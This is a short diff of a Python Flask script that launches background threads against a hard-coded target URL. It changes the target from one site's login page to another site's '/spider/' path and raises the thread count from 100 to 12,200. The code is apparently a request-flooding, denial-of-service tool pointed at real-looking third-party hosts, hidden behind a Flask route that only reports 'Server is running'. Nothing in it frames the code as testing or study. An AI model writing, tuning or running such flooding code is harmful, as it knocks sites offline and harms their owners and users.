@@ -25,8 +25,8 @@ def chek(url):
             print("Request failed")
 
 def start_threads():
-    target_url = "https://alamdar-mod.com/Revenge/public/login"  # ضع الرابط هنا
-    for _ in range(100):
+    target_url = "https://adminpanel.in.net/spider/"  # ضع الرابط هنا
+    for _ in range(12200):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True
         thread.start()
@@ -35,9 +35,6 @@ def start_threads():
 def home():
     return "Server is running with background threads!"
 
-if __name__ == '__main__':
-    threading.Thread(target=start_threads, daemon=True).start()
-    app.run(host='0.0.0.0', port=5000)
 if __name__ == '__main__':
     threading.Thread(target=start_threads, daemon=True).start()
     app.run(host='0.0.0.0', port=5000)
